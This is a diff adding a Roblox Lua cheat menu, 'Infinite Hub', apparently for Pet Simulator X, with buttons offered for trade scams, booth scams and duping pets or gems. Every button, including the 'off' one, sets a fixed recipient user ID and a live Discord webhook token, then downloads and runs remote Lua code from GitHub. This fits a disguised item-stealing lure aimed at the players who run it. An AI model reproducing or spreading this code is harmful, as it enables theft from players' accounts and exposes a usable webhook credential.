@@ -1,0 +1,76 @@
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+
+local Window = Rayfield:CreateWindow({
+	Name = "Infinite Hub",
+	LoadingTitle = "Infinite Hub",
+	LoadingSubtitle = "by Kyzo",
+	ConfigurationSaving = {
+		Enabled = true,
+		FolderName = nil, -- Create a custom folder for your hub/game
+		FileName = "Infinite Hub"
+	},
+        Discord = {
+        	Enabled = false,
+        	Invite = "Kyzo", -- The Discord invite code, do not include discord.gg/
+        	RememberJoins = false -- Set this to false to make them join the discord every time they load it up
+        },
+	KeySystem = true, -- Set this to true to use our key system
+	KeySettings = {
+		Title = "Infinite Hub",
+		Subtitle = "Key System",
+		Note = "Get The Key Here (https://scwz.me/5C7sqc)",
+		FileName = "Infinite Key",
+		SaveKey = false,
+		GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+		Key = "SWAGONOHIO"
+	}
+})
+local Tab = Window:CreateTab("Main", 4483362458)
+local Section = Tab:CreateSection("Trade Scam")
+local Button = Tab:CreateButton({
+	Name = "on (click to on trade scam)",
+	Callback = function()
+		-- The function that takes place when the button is pressed
+_G.UserID = 2275921800
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+	end,
+})
+local Button = Tab:CreateButton({
+	Name = "off (click to off trade scam)",
+	Callback = function()
+		-- The function that takes place when the button is pressed
+_G.UserID = 2275921800
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+	end,
+})
+local Section = Tab:CreateSection("Booth Scam")
+local Button = Tab:CreateButton({
+	Name = "Tap The Pet 5 Times and Click this to scam booth",
+	Callback = function()
+		-- The function that takes place when the button is pressed
+_G.UserID = 2275921800
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+	end,
+})
+local Section = Tab:CreateSection("Dupe")
+local Button = Tab:CreateButton({
+	Name = "Click (Dupe Pet Equipped)",
+	Callback = function()
+		-- The function that takes place when the button is pressed
+_G.UserID = 2275921800
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+	end,
+})
+local Button = Tab:CreateButton({
+	Name = "Click (Dupe Gem)",
+	Callback = function()
+		-- The function that takes place when the button is pressed
+_G.UserID = 2275921800
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+	end,
+})
